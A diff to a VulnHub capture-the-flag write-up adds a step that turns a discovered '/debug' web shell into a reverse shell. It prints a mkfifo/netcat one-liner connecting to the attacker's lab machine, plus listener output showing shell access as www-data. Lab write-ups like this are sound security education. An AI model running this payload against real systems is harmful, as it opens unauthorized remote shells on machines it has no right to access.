@@ -76,8 +76,25 @@ i checked all the directories found by fuzzing untill i reached `/debug` :
 
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/63020c17-85d5-4451-a790-1ed081891850)
 
-this is a virtual shell on web, which we can insert any command on it
+this is a virtual shell on web, which we can insert any command on it, why not  a reverse shell ?
 
+so just use this payload and start a listener on your machine :
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.127.128 4444 >/tmp/f
+```
+
+```bash
+root@kali: nc -nvlp 4444
+
+nc -nvlp 5555 
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.133] 58766
+/bin/sh: 0: can't access tty; job control turned off
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+```
 
 
 
